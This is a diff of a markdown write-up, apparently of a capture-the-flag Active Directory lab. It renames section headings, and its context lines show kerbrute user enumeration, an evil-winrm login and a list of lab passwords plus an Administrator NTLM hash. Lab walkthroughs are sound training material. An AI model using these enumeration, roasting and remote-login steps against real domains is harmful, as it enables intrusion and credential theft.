@@ -5,14 +5,14 @@
 ```
 If Active Directory => [[Synchronize NTP]] with the domain controller.
 
-# Content
+### Content
 
 - RPC Enumeration
 - Web Enumeration valid users
 - ASREPRoast Attack
 - Hashcat cracking krbtgt5 hash
 
-# Reconnaissance
+### Reconnaissance
 
 Initial reconnaissance for TCP ports
 ```bash
@@ -87,7 +87,7 @@ Host: 10.10.10.175 ()   Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/
 This retrieves a lot of open ports that weren't discovered on our initial scan, such as tcp/88 and tcp/80, so let's enumerate the web service:
 ![[Pasted image 20230207235256.png]]
 Only some users are listed, which gives us a potential attack for an ASREPRoast attack.
-# Exploitation
+### Exploitation
 [[KERBEROS (tcp-88)]] enumeration throws a user hash: ^9e845d
 ```bash
 kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 /usr/share/seclists/Kerberos/A-ZSurnames.txt
@@ -136,7 +136,7 @@ evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 *Evil-WinRM* PS C:\Users\FSmith\Documents>
 ```
 
-# Root privesc
+### Privilege Escalation
 Now that we are user fsmith and we inside the machine, let's enumerate our user:
 ```bash
 *Evil-WinRM* PS C:\Users\FSmith\Documents> whoami /all
@@ -279,7 +279,7 @@ Microsoft Windows [Version 10.0.17763.973]
 C:\Windows\system32>
 ```
 
-# Credentials
+### Credentials
 ```bash
 fsmith:Thestrokes23
 svc_loanmgr:Moneymakestheworldgoround!
@@ -287,11 +287,11 @@ Administrator -> NTLM Hash: 823452073d75b9d1cf70ebdf86c7f98e
 ```
 
 
-# Notes
+### Notes
 
 - Always u
 
-# Resources:
+### References
 
 * [WINPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20230205) 
 
